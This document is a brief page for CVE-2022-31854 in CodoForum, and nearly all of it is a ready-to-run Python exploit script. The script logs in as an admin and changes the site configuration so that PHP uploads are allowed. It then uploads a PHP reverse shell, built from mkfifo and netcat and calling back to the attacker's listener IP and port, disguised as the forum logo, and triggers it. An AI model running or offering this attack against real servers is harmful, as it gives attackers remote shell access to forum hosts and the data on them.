# CodoForum - CVE-2022-31854

CodoForum authenticated RCE via file upload bypass.

```python
#!/usr/bin/python3
import requests
import random
import string
import optparse
from bs4 import BeautifulSoup

parser = optparse.OptionParser()
parser.add_option('-t', '--target-url', dest='target', help='Base URL')
parser.add_option('-u', '--username', dest='username', help='Admin username')
parser.add_option('-p', '--password', dest='password', help='Admin password')
parser.add_option('-i', '--listener-ip', dest='ip', help='Listener IP')
parser.add_option('-n', '--port', dest='port', help='Listener Port')

options, args = parser.parse_args()

session = requests.Session()

def login():
    login_url = f"http://{options.target}/admin/?page=login"
    data = {"username": options.username, "password": options.password}
    res = session.post(login_url, data=data)
    if "Dashboard" in res.text or res.status_code == 200:
        return True
    return False

def upload_and_exploit():
    config_url = f"http://{options.target}/admin/index.php?page=config"
    get_config = session.get(config_url)
    soup = BeautifulSoup(get_config.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'CSRF_token'})['value']

    file_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".php"
    rev_shell = f"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {options.ip} {options.port} >/tmp/f');?>"

    data = {
        "site_title": "CodoForum",
        "forum_attachments_exts": "jpg,jpeg,png,gif,php",
        "CSRF_token": csrf_token
    }
    files = {'forum_logo': (file_name, rev_shell, 'application/x-php')}
    session.post(config_url, data=data, files=files)

    trigger_url = f"http://{options.target}/sites/default/assets/img/attachments/{file_name}"
    try:
        session.get(trigger_url, timeout=5)
    except requests.exceptions.ReadTimeout:
        print("[+] Shell triggered!")

if __name__ == "__main__":
    if login():
        upload_and_exploit()
```
